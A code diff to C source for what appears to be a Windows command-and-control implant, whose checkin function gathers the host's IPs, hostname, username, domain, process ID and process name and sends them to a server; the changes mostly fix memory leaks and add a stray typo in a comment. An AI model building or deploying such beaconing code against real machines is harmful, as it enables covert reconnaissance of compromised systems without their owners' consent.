@@ -63,7 +63,7 @@ BYTE getArch()
 	return 0x86;
 }
 
-// Getting the current hostname
+// Getting the cujrent hostname
 PCHAR getHostname()
 {
 	LPSTR data = NULL;
@@ -120,7 +120,8 @@ LPWSTR getDomain()
 // Getting the current OS Name (not implemented)
 char* getOsName()
 {
-	return (PCHAR)"Windows";
+	static char osName[] = "Windows";
+	return osName;
 }
 
 // Getting the current process name
@@ -155,27 +156,38 @@ PParser checkin()
 	addInt32(checkin, numberOfIPs);
 	for (UINT32 i=0 ; i< numberOfIPs; i++)
 		addInt32(checkin, tableOfIPs[i]);
+
+	if (tableOfIPs)
+		LocalFree(tableOfIPs);
+
+	PCHAR hostname = getHostname();
+	char* username = getUserName();
+	LPWSTR domain = getDomain();
+	char* currentProcName = getCurrentProcName();
 	
 	// OS 
 	addString(checkin, getOsName(), TRUE);
 	// Arch
 	addByte(checkin, getArch());
 	// Hostname
-	addString(checkin, getHostname(), TRUE);
+	addString(checkin, hostname, TRUE);
 	// Username
-	addString(checkin, getUserName(), TRUE);
+	addString(checkin, username, TRUE);
 	// Domain
-	addWString(checkin, getDomain(), TRUE);
+	addWString(checkin, domain, TRUE);
 	// PID
 	addInt32(checkin, GetCurrentProcessId());
 	// ProcessName
-	addString(checkin, getCurrentProcName(), TRUE);
+	addString(checkin, currentProcName, TRUE);
 	// External IP (useless)
 	addString(checkin, (PCHAR)"1.1.1.1", TRUE);
 
-	Parser* ResponseParser = sendPackage(checkin);
+	LocalFree(hostname);
+	LocalFree(username);
+	LocalFree(domain);
+	LocalFree(currentProcName);
 
-	// freePackage(checkin);
+	Parser* ResponseParser = sendPackage(checkin);
 
 	if (!ResponseParser)
 		return NULL;
